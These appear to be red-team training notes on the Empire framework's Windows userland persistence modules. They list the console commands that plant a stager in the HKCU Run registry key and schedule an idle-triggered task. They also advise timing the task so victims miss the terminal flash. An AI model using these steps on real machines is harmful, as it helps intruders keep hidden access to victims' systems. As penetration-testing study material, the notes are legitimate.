Empire - Userland Persistance

+ Establish "Userland" persistance so that you can escalate priviledge and move laterally

+ We will apply Empire userland persistance module registry and schtasks


Empire userland/persistance/registry module

+ Establish persistance in Windows registry by inserting Empire stager at HKCU\Software\Microsoft\Windows\CurrentVersion\Run

+ We can apply different registry key, an alternate data stream or event log ID

+ This module not OPSEC safe, when a user log in, they will see a terminal flash of stager execution

+ Use persistance/userland/registry module
	# (Empire) > usemodule persistance/userland/registry
	
+ Configure the listener and other option as you require and execute
	# (Empire powershell/persistance/userland/registry) > set listener http
	# (Empire powershell/persistance/userland/registry) > execute

+ When victims power on or login back to the system, we can maintain the connection with victim but victim can suspect something is happening when the command prompt is flashing


Empire userland/persistance/schtasks module

+ This module simply creates a low privileged schedule task that will run at a specific time of day or after the user has been idle for a specified time

+ Victims idle time is generally a best option as the task will only run if the user has been away from the computer

+ Terminal will briefly flash but a user probably won't be around to see it.

+ Use persistance/userland/schtasks module
	# (Empire) > usemodule persistance/userland/schtasks
	
+ Configure the listener, idle time in minute and other option as you require and execute
	# (Empire powershell/persistance/userland/schtasks) > set listener http
	# (Empire powershell/persistance/userland/schtasks) > set IdleTime 1
	# (Empire powershell/persistance/userland/schtasks) > execute
	
+ This module can be check in task scheduler

+ Empire provides a cleanup option that will restore the system to its pre persistence state
